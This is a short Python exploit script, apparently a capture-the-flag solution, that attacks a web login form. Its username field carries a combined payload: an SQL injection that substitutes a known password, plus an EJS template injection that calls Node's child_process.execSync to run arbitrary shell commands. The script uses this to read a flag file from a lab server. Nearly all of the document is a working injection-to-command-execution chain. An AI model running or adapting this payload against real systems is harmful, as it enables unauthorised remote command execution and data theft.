#!/usr/bin/env python3

import requests


def login(username, password):
    data = {"username": username, "password": password}
    r = requests.post(login_url, data=data)
    return r.text


# LOCAL = True
LOCAL = False

url = "http://10.113.184.121:10081/"
password = "FLAG{sqlite_js0n_inject!on}"

if LOCAL:
    url = "http://localhost:3000/"
    password = "FLAG{flag-1}"

login_url = f"{url}login"


def run_command(command):
    username = f"\") AS _, '{password}' AS password FROM db -- <%= global.process.mainModule.require('child_process').execSync('{command}').toString() %>"
    return login(username, password)


# print(run_command("ls /"))
print(run_command("cat /flag2-1PRmDsTXoo3uPCdq.txt"))
